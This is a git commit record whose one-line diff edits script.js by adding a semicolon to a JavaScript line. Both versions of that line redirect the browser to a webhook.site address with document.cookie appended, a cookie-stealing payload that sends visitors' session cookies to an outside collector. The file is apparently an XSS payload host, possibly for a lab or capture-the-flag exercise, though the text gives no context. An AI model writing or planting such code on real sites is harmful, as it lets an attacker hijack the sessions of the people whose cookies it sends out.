02ba1ac89767c2d620115d8e9c9c6feec7a91eec
couragedogg <93422793+couragedogg@users.noreply.github.com>
2025-12-16 00:37:42 +0900

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,1 @@
-location.href="	https://webhook.site/820869d9-4c06-46e6-84c9-e9791d38287c"+document.cookie
+location.href="	https://webhook.site/820869d9-4c06-46e6-84c9-e9791d38287c"+document.cookie;
